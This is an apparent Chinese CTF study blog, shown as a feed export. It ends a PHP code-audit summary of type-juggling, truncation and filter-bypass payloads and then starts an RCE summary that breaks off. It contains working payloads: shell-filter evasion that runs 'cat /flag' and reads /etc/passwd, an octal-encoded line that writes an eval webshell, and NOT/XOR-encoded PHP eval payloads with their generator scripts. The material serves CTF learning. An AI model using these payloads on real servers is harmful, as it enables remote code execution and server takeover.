&#125;&#125;?&gt;</code></pre><p>这个很简单</p><pre><code class="php">admin&#39;)#</code></pre><h2 id="x-forwarded-for绕过"><a href="#x-forwarded-for绕过" class="headerlink" title="x-forwarded-for绕过"></a>x-forwarded-for绕过</h2><pre><code class="php">&lt;?phpfunction GetIP()&#123;if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;]))    $cip = $_SERVER[&quot;HTTP_CLIENT_IP&quot;];else if(!empty($_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]))    $cip = $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];else if(!empty($_SERVER[&quot;REMOTE_ADDR&quot;]))    $cip = $_SERVER[&quot;REMOTE_ADDR&quot;];else    $cip = &quot;0.0.0.0&quot;;return $cip;&#125;$GetIPs = GetIP();if ($GetIPs==&quot;1.1.1.1&quot;)&#123;echo &quot;Great! Key is *********&quot;;&#125;else&#123;echo &quot;错误！你的IP不在访问列表之内！&quot;;&#125;?&gt;</code></pre><p> HTTP头添加X-Forwarded-For:1.1.1.1  </p><h2 id="intval函数四舍五入"><a href="#intval函数四舍五入" class="headerlink" title="intval函数四舍五入"></a>intval函数四舍五入</h2><pre><code class="php">&lt;?phpif($_GET[id]) &#123;mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);mysql_select_db(SAE_MYSQL_DB);$id = intval($_GET[id]); ## 这里过滤只有一个intval$query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#39;$id&#39;&quot;));if ($_GET[id]==1024) &#123;    echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;    &#125;  else&#123;    echo($query[content]);  &#125;&#125;</code></pre><p>payload:</p><pre><code class="php">?a=1024.1</code></pre><h2 id="浮点数精度忽略"><a href="#浮点数精度忽略" class="headerlink" title="浮点数精度忽略"></a>浮点数精度忽略</h2><p>intval 函数最大的值取决于操作系统:<br>Copy32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。 64 位系统上，最大带符号的 integer 值是 9223372036854775807。 </p><pre><code class="php">if ($req[&quot;number&quot;] != intval($req[&quot;number&quot;]))</code></pre><p> 在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了。 输入number = 1.00000000000000010, 右边变成1.0, 而左与右比较会相等  </p><h2 id="常见截断"><a href="#常见截断" class="headerlink" title="常见截断"></a>常见截断</h2><h3 id="iconv-异常字符截断"><a href="#iconv-异常字符截断" class="headerlink" title="iconv 异常字符截断"></a>iconv 异常字符截断</h3><p> iconv遇到不能识别的内容，会从第一个不能识别的字符开始截断，并生成一个E_NOTICE<br>fuzz一下</p><pre><code class="php">&lt;?php$a =&quot;1.php&quot;;$b =&quot;.jpg&quot;;for($i=0; $i&lt;300; $i++)&#123;    $c = $a.chr($i).$b;    $d = iconv(&quot;UTF-8&quot;,&quot;gb2312&quot;, $c);    echo &quot;$i ==&gt; &quot;.$d.&quot;n&quot;;    echo &quot;\n&quot;;&#125;</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664851197425-c4dff480-15bc-42b3-b967-1517498a0c2c.png" alt="image.png"></p><p>经过测试， chr(128)到chr(255)都可以截断 ，按理说是截断成1.php，可能环境有点问题吧！</p><h3 id="eregi、ereg可用-00截断"><a href="#eregi、ereg可用-00截断" class="headerlink" title="eregi、ereg可用%00截断"></a>eregi、ereg可用%00截断</h3><p> 功能：正则匹配过滤 条件：要求php&lt;5.3.4   魔术引号关闭<br>详见上文</p><h3 id="move-uploaded-file-用-0截断"><a href="#move-uploaded-file-用-0截断" class="headerlink" title="move_uploaded_file 用\0截断"></a>move_uploaded_file 用\0截断</h3><p>5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7 原来在高版本（受影响版本中），PHP把长度比较的安全检查逻辑给去掉了，导致了漏洞的发生 cve： <a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348">https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348</a><br>move_uploaded_file($_FILES[‘x’][‘tmp_name’],”/tmp/test.php\x00.jpg”)<br>上传抓包修改name为a.php\0jpg（\0是nul字符），可以看到$_FILES[‘xx’][‘name’]存储的字符串是a.php，不会包含\0截断之后的字符，因此并不影响代码的验证逻辑。<br>但是如果通过$_REQUEST方式获取的，则可能出现扩展名期望值不一致的情况，造成“任意文件上传”。</p><h3 id="inclue用-和-截断"><a href="#inclue用-和-截断" class="headerlink" title="inclue用?和#截断"></a>inclue用?和#截断</h3><pre><code class="php">&lt;?php$name=$_GET[&#39;name&#39;];  $filename=$name.&#39;.php&#39;;  include $filename;  ?&gt;</code></pre><p> 当输入的文件名包含URL时，问号截断则会发生，并且这个利用方式不受PHP版本限制，原因是Web服务其会将问号看成一个请求参数。<br><strong>如果能够包含远程文件</strong>时，可以使用?和%23进行伪截断，<strong>该方法对PHP版本没要求</strong>，<strong>但是要求能够包含远程文件,即</strong>allow_url_include=On<br>?原理是把后面的值看成参数，例如<a href="http://172.17.0.3/1.php?.html">http://172.17.0.3/1.php?.html</a><br>#原理就是前面说的#被include认为是锚点，例如<a href="http://172.17.0.3/1.txt#.html%EF%BC%8C#%E5%90%8E%E9%9D%A2%E7%9A%84%E8%A2%AB%E8%AE%A4%E4%B8%BA%E6%98%AF%E9%94%9A%E7%82%B9(%E4%BD%BF%E7%94%A8url%E7%BC%96%E7%A0%81%E5%90%8E%E7%9A%84#---&gt;%23)">http://172.17.0.3/1.txt#.html，#后面的被认为是锚点(使用url编码后的#---&gt;%23)</a><br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664852581232-32255fa9-6d2d-4002-8c63-d223c952a637.png" alt="image.png"><br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664852618885-b65805ad-8a9f-4963-870e-bdd63b34158f.png" alt="image.png"></p><h2 id="strpos数组绕过NULL与ereg正则-00截断"><a href="#strpos数组绕过NULL与ereg正则-00截断" class="headerlink" title="strpos数组绕过NULL与ereg正则%00截断"></a>strpos数组绕过NULL与ereg正则%00截断</h2><p>方法一:%00截断<br>注意点:需将#编码<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664856729744-a800de1d-40cc-498f-bef1-af960c8429dd.png" alt="image.png"></p><p>方法二:数组绕过<br>直接传入一个数组<br>既要是纯数字,又要有’#biubiubiu’，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求. 所以输入nctf[]= 那为什么ereg()也能符合呢?因为ereg()在出错时返回的也是null,null!==false,所以符合要求.<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664856872643-ee08f73b-d6b9-45d2-bf2b-3123fa02afa1.png" alt="image.png"></p><h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a><strong>十六进制与数字比较</strong></h2><pre><code class="php">&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123;    $flag = &#39;flag&#123;test&#125;&#39;;    $one = ord(&#39;1&#39;);  //ord — 返回字符的 ASCII 码值    $nine = ord(&#39;9&#39;); //ord — 返回字符的 ASCII 码值    $number = &#39;3735929054&#39;;    // Check all the input characters!    for ($i = 0; $i &lt; strlen($number); $i++)    &#123;         // Disallow all the digits!        $digit = ord($temp&#123;$i&#125;);        if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )        &#123;            // Aha, digit not allowed!            return &quot;flase&quot;;        &#125;    &#125;    if($number == $temp)        return $flag;&#125;$temp = $_GET[&#39;password&#39;];echo noother_says_correct($temp);?&gt;</code></pre><p> 这里，它不让输入1到9的数字，但是后面却让比较一串数字<br> 在php里面，0x开头则表示16进制，将这串数字转换成16进制之后发现，是deadc0de<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664872563600-ed999410-6755-4b2a-be29-7d799a66485a.png" alt="image.png"><br>在开头加上0x，代表这个是16进制的数字，然后再和十进制的 3735929054比较，答案当然是相同的，返回true拿到flag<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664872687987-b73ff2a8-2ee9-49e6-92b9-9fa66c50e642.png" alt="image.png"></p><h2 id="数字验证正则绕过"><a href="#数字验证正则绕过" class="headerlink" title="数字验证正则绕过"></a><strong>数字验证正则绕过</strong></h2><pre><code class="php">&lt;?phperror_reporting(0);$flag = &#39;flag&#123;test&#125;&#39;;if  (&quot;POST&quot; == $_SERVER[&#39;REQUEST_METHOD&#39;]) &#123;     $password = $_POST[&#39;password&#39;];     if (0 &gt;= preg_match(&#39;/^[[:graph:]]&#123;12,&#125;$/&#39;, $password)) //preg_match — 执行一个正则表达式匹配    &#123;         echo &#39;Wrong Format&#39;;         exit;     &#125;     while (TRUE)     &#123;         $reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;;         if (6 &gt; preg_match_all($reg, $password, $arr))             break;         $c = 0;         $ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母         foreach ($ps as $pt)         &#123;             if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))                 $c += 1;         &#125;         if ($c &lt; 3) break;         //&gt;=3，必须包含四种类型三种与三种以上        if (&quot;42&quot; == $password) echo $flag;         else echo &#39;Wrong password&#39;;         exit;     &#125; &#125;?&gt;</code></pre><p> 意为必须是12个字符以上（非空格非TAB之外的内容）<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664878820196-cd2ab7eb-c079-4f8b-8eb4-1a4746b183f2.png" alt="image.png"><br>   意为匹配到的次数要大于6次<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664878914886-87653c10-7d3d-4369-8e09-1779ffeda157.png" alt="image.png"><br> 意为必须要有大小写字母，数字，字符内容三种与三种以上<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664878981551-c67275d3-8869-4f35-9a40-f5f2b855c653.png" alt="image.png"><br>传入值 必须等于42<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664879091286-6802d5a4-2753-4d70-aae0-ea2e9f48e862.png" alt="image.png"><br>可构造payload:</p><pre><code class="php">42.00e+00000000000 或420.000000000e-1</code></pre><h2 id="switch没有break-字符与0比较绕过"><a href="#switch没有break-字符与0比较绕过" class="headerlink" title="switch没有break 字符与0比较绕过"></a><strong>switch没有break 字符与0比较绕过</strong></h2><p>首先我们来回顾下switch语句:<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664880863864-69ee9b4d-f83f-4999-94de-684c5fa6433f.png" alt="image.png"><br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664880871606-a49b0ffd-3cd2-4ab2-a99b-1e498624758e.png" alt="image.png"><br>匹配到了2，然后2及其2后面的语句都会执行，且不会再进行匹配。<br>那我们接下来看这个题目:</p><pre><code class="php">&lt;?phperror_reporting(0);if (isset($_GET[&#39;which&#39;]))&#123;    $which = $_GET[&#39;which&#39;];    switch ($which)    &#123;    case 0:    case 1:    case 2:        require_once $which.&#39;.php&#39;;         echo $flag;        break;    default:        echo GWF_HTML::error(&#39;PHP-0817&#39;, &#39;Hacker NoNoNo!&#39;, false);        break;    &#125;&#125;?&gt;</code></pre><p>直接传入test<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664881120398-f8cbf511-b917-4d02-a540-dc4640c33082.png" alt="image.png"><br>因为当一个字符串与数字比较时，会将字符串转换为数字,传入test后就与0匹配，就不会继续进行匹配了。</p><h2 id="利用提交数组绕过逻辑"><a href="#利用提交数组绕过逻辑" class="headerlink" title="利用提交数组绕过逻辑"></a>利用提交数组绕过逻辑</h2><pre><code class="php">&lt;?php $role = &quot;guest&quot;;$flag = &quot;flag&#123;test_flag&#125;&quot;;$auth = false;if(isset($_COOKIE[&quot;role&quot;]))&#123;    $role = unserialize(base64_decode($_COOKIE[&quot;role&quot;]));    if($role === &quot;admin&quot;)&#123;        $auth = true;    &#125;    else&#123;        $auth = false;    &#125;&#125;else&#123;    $role = base64_encode(serialize($role));    setcookie(&#39;role&#39;,$role);&#125;if($auth)&#123;    if(isset($_POST[&#39;filename&#39;]))&#123;        $filename = $_POST[&#39;filename&#39;];        $data = $_POST[&#39;data&#39;];        if(preg_match(&#39;[&lt;&gt;?]&#39;, $data)) &#123;            die(&#39;No No No!&#39;.$data);        &#125;        else &#123;            $s = implode($data);            if(!preg_match(&#39;[&lt;&gt;?]&#39;, $s))&#123;                $flag=&#39;None.&#39;;            &#125;            $rand = rand(1,10000000);            $tmp=&quot;./uploads/&quot;.md5(time() + $rand).$filename;            file_put_contents($tmp, $flag);            echo &quot;your file is in &quot; . $tmp;        &#125;    &#125;    else&#123;        echo &quot;Hello admin, now you can upload something you are easy to forget.&quot;;        echo &quot;there are the source.&quot;;        echo &#39;&lt;textarea rows=&quot;10&quot; cols=&quot;100&quot;&gt;&#39;;        echo htmlspecialchars(str_replace($flag,&#39;flag&#123;???&#125;&#39;,file_get_contents(__FILE__)));        echo &#39;&lt;/textarea&gt;&#39;;    &#125;&#125;else&#123;    echo &quot;Sorry. You have no permissions.&quot;;&#125;?&gt;</code></pre><p>访问页面<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664882469000-0dd64e6a-ce6b-4b80-8ab9-974ed08e5a16.png" alt="image.png"><br>首先将cookie的用户修改为admin，并替换<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664882512840-8c8d4853-af5c-4dac-a0bf-8c9a1e0d6076.png" alt="image.png"><br>然后再次访问，获得题目源码<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664882543396-6c93429c-9f67-486a-b93c-3eaadd79a6b9.png" alt="image.png"></p><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664882956551-bc37572d-7354-434b-a73c-c6c77ce88bea.png" alt="30_1.png"><br> preg_match只能处理字符串，当传入的subject是数组时会返回false<br>想要通过Post请求的形式传入数组可以使用 data[0]=123&amp;data[1]=&lt;&gt; 的形式传入数组，这样的话在执行 implode() 函数的时候就不会使 &amp;s 为空，成功绕过这段逻辑拿到flag。<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664882977530-c17d78ee-94a5-482a-b426-04536aece637.png" alt="30_2.png"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h1><p><a href="https://www.cnblogs.com/anbus/p/10000571.html">https://www.cnblogs.com/anbus/p/10000571.html</a><br><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a><br><a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">https://www.cnblogs.com/20175211lyz/p/12198258.html</a><br><a href="https://www.cnblogs.com/-mo-/p/11652926.html">https://www.cnblogs.com/-mo-/p/11652926.html</a><br><a href="http://t.zoukankan.com/drkang-p-8689205.html">http://t.zoukankan.com/drkang-p-8689205.html</a><br><a href="https://github.com/bowu678/php_bugs">https://github.com/bowu678/php_bugs</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rce考点总结</title>
      <link href="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/"/>
      <url>/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近准备把所学的漏洞全部仔细的整理一遍，一、是为了让自己对这些知识点有些全面系统的认识 二、是写题的时候可以直接翻博客不需要再去找那么多的文章，此外也希望对以后社团的学弟学妹有些帮助，这些文章的内容只有一部分为我自己写的，很多是搬运师傅的文章，因为很多师傅的文章写的已经十分完美，特别是p神，很多年前发表的东西现在仍不过时。我所做的主要是把文章整合在一起，对漏洞的考点有更加全面的认识！</p><h1 id="什么是rce"><a href="#什么是rce" class="headerlink" title="什么是rce"></a>什么是rce</h1><p>什么是rce?</p><p>既远程代码/命令执行，能够让攻击者直接向后台服务器远程写入服务器系统命令或者代码，从而控制后台系统。</p><p>命令执行：直接执行我们输入的恶意命令</p><p>代码执行：直接执行我们所输入的恶意代码</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>命令执行漏洞形成的原因是web服务器对用户输入的命令安全监测不足，导致恶意代码被执行。</p><p><strong>定义：</strong>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p><p><strong>永远不要相信用户的输入！</strong></p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p> 继承Web服务程序的权限去执行系统命令或读写文件<br> 反弹shell<br> 控制整个网站甚至控制服务器<br> 进一步内网渗透</p><h1 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><pre><code>system()  输出并返回最后一行shell结果exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面shell_exec()  通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上（替换system）</code></pre><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><pre><code>eval()函数:用来执行一个字符串表达式，并返回表达式的值assert()函数:在php语言中是用来判断一个表达式是否成立,返回true or false,但是字符串参数会被执行</code></pre><h1 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h1><p>我们需要注意，当我们正常输入的时候，在大多数情况下是不会触发这一漏洞的，我们需要一些小tips。</p><p>常见技巧：</p><pre><code class="php">一、常见管道符：‘|’ 直接执行后面的语句‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句‘&amp;’ 前面和后面命令都要执行，无论前面真假&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令Linux:Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘&amp;’ 作用相同</code></pre><pre><code class="php">二、空格绕过(空格被过滤)：&lt;  --  重定向，如cat&lt;flag.php&lt;&gt;      --   重定向，如cat&lt;&gt;flag.php%09  --  需要php环境，如cat%09flag.php$&#123;IFS&#125;  --  单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个&#123;&#125;就固定了变量名，如cat$&#123;IFS2&#125;flag.php$IFS$9  --  后面加个$与&#123;&#125;类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php</code></pre><pre><code class="php">三、黑名单绕过1、拼接a=c;b=at;c=flag;$a$b $ca=c;b=at;c=heb;d=ic;ab&#123;c&#125;&#123;d&#125;2、base64编码echo MTIzCg==|base64 -d 其将会打印123echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash ==&gt;cat /flagecho &quot;Y2F0IC9mbGFn&quot;|base64 -d|sh ==&gt;cat /flag3、hex编码echo &quot;636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag4、单引号、双引号,反单引号绕过ca&#39;&#39;t flag 或ca&quot;&quot;t flagca&#39;&#39;t te&quot;&quot;st.phpc``a``t /etc/passwd5、反斜杠绕过ca\t fl\agcat te\st.php6、绕过ip中的句点网络地址可以转换成数字地址，比如127.0.0.1可以转化为2130706433。可以直接访问http://2130706433或者http://0x7F000001，这样就可以绕过.的ip过滤。在线转换地址：数字转IP地址 IP地址转数字 域名转数字IP7、利用oct编码（八进制）绕过$(printf &quot;\154\163&quot;)  //ls命令$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) ==&gt;cat /flag&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 ==&gt;cat /flag#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php在线转换网站:https://photo333.com/text-to-octal-zh.php8、&#39;/&#39;被过滤绕过可利用&#39;;&#39;拼接命令绕过cd ..;cd ..;cd ..;cd ..;cd etc;cat passwd (也可以利用第七步的八进制绕过)9、通配符绕过列如cat /passwd：??? /e??/?a????cat /e*/pa*10、利用未初始化变量$u绕过cat$u /etc/passwdcat /etc$u/passwd11、glob通配符cat t[a-z]stcat t&#123;a,b,c,d,e,f&#125;st12、利用PATH绕过可以通过截断和拼接来得到我们想要的来getshell$&#123;PATH:5:1&#125; //l$&#123;PATH:2:1&#125; //s$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125; //拼接后是ls,执行命令$&#123;PATH:5:1&#125;s //拼接后是ls,执行命令</code></pre><pre><code class="php">四、绕过长度限制1，通过&gt;来创建文件&gt;flag.txt2，通过&gt;将命令结果存入文件中echo &quot;hello hacker&quot; &gt; flag.txt3，&gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容echo &quot;hello hacker&quot; &gt;&gt; flag.txt4、Linux中命令换行在Linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加\，可以将一条命令写在多行。比如：cat flagca\t\ fla\g.txt将命令一条一条输入一个文本中再执行:root@kali:~# echo &quot;ca\\&quot;&gt;cmdroot@kali:~# echo &quot;t\\&quot;&gt;&gt;cmdroot@kali:~# echo &quot; fl\\&quot;&gt;&gt;cmdroot@kali:~# echo &quot;ag&quot;&gt;&gt;cmdroot@kali:~# cat cmdca\t\ fl\agroot@kali:~# sh cmdthis is your flag</code></pre><pre><code class="php">五、各种读文件命令cat--由第一行开始显示内容，并将所有内容输出tac--从最后一行倒序显示内容，并将所有内容输出more-- 根据窗口大小，一页一页的现实文件内容less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符head-- 只显示头几行tail --只显示最后几行nl --类似于cat -n，显示时输出行号tailf-- 类似于tail -fvim --使用vim工具打开文本vi --使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出</code></pre><p>上面介绍的这些方法可以解决大部分ctf题目，但是我们会经常遇到更加严苛的过滤，我们就要介绍接下来的一些题目类型和解决方法</p><h1 id="无数字字母rce"><a href="#无数字字母rce" class="headerlink" title="无数字字母rce"></a>无数字字母rce</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>我们以一道经典的题目为例:</p><p>[极客大挑战 2019]RCE ME</p><p>题目代码:</p><pre><code class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123;            $code=$_GET[&#39;code&#39;];                    if(strlen($code)&gt;40)&#123;                                        die(&quot;This is too Long.&quot;);                                                &#125;                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                                        die(&quot;NO.&quot;);                                                &#125;                    @eval($code);&#125;else&#123;            highlight_file(__FILE__);&#125;// ?&gt;</code></pre><h2 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h2><p>php7</p><p>脚本:</p><pre><code class="php">&lt;?php//在命令行中运行/*author yu22x*/fwrite(STDOUT,&#39;[+]your function: &#39;);$system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); fwrite(STDOUT,&#39;[+]your command: &#39;);$command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); echo &#39;[*] (~&#39;.urlencode(~$system).&#39;)(~&#39;.urlencode(~$command).&#39;);&#39;;</code></pre><p>脚本使用的时候注意有些()不可以一起转进去，我们先来测试一下</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121200544538.png" alt="image-20221121200544538"></p><pre><code class="php">http://127.0.0.1/index.php?code=(~%8f%97%8f%96%91%99%90)(); //我们不需要参数只是测试，把后面的取反符号去掉即可</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121191347692.png" alt="image-20221121191347692"></p><p>我们现在来构造可以执行命令的字符串</p><pre><code class="php">http://480abdfe-af61-4f9a-bfdf-2e0227fda03b.node4.buuoj.cn:81/?code=(~%8c%86%8c%8b%9a%92)(~%93%8c); //system(&#39;ls&#39;)</code></pre><p>按理说没问题的哦，我本地是可以的，不过在buu没有执行成功，不过问题不大，还有很多种方法</p><p>这题可以通过:</p><pre><code class="php">assert(eval($_POST[sakura]))</code></pre><p>还是利用取反构造</p><pre><code>(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%9E%94%8A%8D%9E%A2%D6);</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121200843416.png" alt="image-20221121200843416"></p><p>这里尝试执行命令，同样没反应，那么这题应该是没有回显的，但是我们可以使用蚁剑去连接!</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121194931677.png" alt="image-20221121194931677"></p><p>这题到这里并没有结束，不过后面并不是我们需要关注的重点，我们就先忽略吧！</p><h2 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h2><p>php7</p><p>由于buu的题目无回显，我们直接把源码搭建在本地进行测试:</p><p>给出两个脚本:</p><p>yihuo.php</p><pre><code class="php">&lt;?php/*author yu22x*/$myfile = fopen(&quot;xor_rce.txt&quot;, &quot;w&quot;);$contents=&quot;&quot;;for ($i=0; $i &lt; 256; $i++) &#123;     for ($j=0; $j &lt;256 ; $j++) &#123;         if($i&lt;16)&#123;            $hex_i=&#39;0&#39;.dechex($i);        &#125;        else&#123;            $hex_i=dechex($i);        &#125;        if($j&lt;16)&#123;            $hex_j=&#39;0&#39;.dechex($j);        &#125;        else&#123;            $hex_j=dechex($j);        &#125;        $preg = &#39;/[a-z0-9]/i&#39;; //根据题目给的正则表达式修改即可        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;                    echo &quot;&quot;;    &#125;          else&#123;        $a=&#39;%&#39;.$hex_i;        $b=&#39;%&#39;.$hex_j;        $c=(urldecode($a)^urldecode($b));        if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;            $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;        &#125;    &#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile);</code></pre><p>yihuo.py</p><pre><code class="python"># -*- coding: utf-8 -*-# author yu22ximport requestsimport urllibfrom sys import *import osdef action(arg):   s1=&quot;&quot;   s2=&quot;&quot;   for i in arg:       f=open(&quot;xor_rce.txt&quot;,&quot;r&quot;)       while True:           t=f.readline()           if t==&quot;&quot;:               break           if t[0]==i:               #print(i)               s1+=t[2:5]               s2+=t[6:9]               break       f.close()   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;^\&quot;&quot;+s2+&quot;\&quot;)&quot;   return(output)   while True:   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;   print(param)</code></pre><p>php运行后生成一个txt文档，包含所有可见字符的异或构造结果。<br> 接着运行python脚本即可。<br> 运行结果</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121201209130.png" alt="image-20221121201209130"></p><pre><code>(&quot;%0b%08%0b%09%0e%06%0f&quot;^&quot;%7b%60%7b%60%60%60%60&quot;)();  //phpinfo()(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%08%0f%01%0d%09&quot;^&quot;%7f%60%60%60%60%60&quot;); 